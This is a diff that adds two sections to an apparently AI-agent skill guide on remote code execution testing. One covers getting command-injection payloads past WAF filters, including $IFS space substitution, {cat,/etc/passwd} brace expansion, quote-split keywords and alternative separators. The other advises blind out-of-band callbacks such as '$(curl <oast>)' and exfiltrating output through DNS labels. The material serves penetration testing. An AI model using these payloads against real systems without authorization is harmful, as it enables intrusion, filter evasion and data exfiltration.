@@ -245,6 +245,27 @@ pop graphic-context
   payload only when OAST + selective reads are insufficient — never
   drop a persistent shell when a single targeted command will prove it.
 
+## Block Handling
+
+A `403`/WAF on a command payload is `blocked`, not `ruled_out`. The space and the
+keyword are what rules match — split them: `$IFS`/`${IFS}`/`<` for spaces,
+`{cat,/etc/passwd}` brace expansion, quotes/backslashes to break keywords
+(`c""at`, `w\ho\am\i`), and `%0a`/`;`/`|`/`&&`/`$()`/backticks as alternative
+separators. Lead with a blind OAST callback (no reflected output to trip
+output-based rules). See `vulnerabilities/waf_evasion.md`
+(`load_skill(["waf_evasion"])`); for injection into a trusted binary's flags see
+`argument_injection.md`.
+
+## Blind-First — OOB Is the Default, Not the Fallback
+
+Most real command/code injection is blind — no stdout in the HTTP response. A 200
+with nothing reflected is where blind RCE hides, so **lead with an OOB callback**
+before concluding absence: `; nslookup <id>.oast`, `$(curl <oast>)`, or a time
+delay. A single DNS/HTTP hit proves execution with zero reflected output — drive it
+with the concrete interactsh generate+poll workflow in `second_order_injection.md`,
+and exfil command output through a DNS label / HTTP param when the response won't
+carry it. "No output" is a reason to go out-of-band, never a reason to close.
+
 ## Summary
 
 RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.
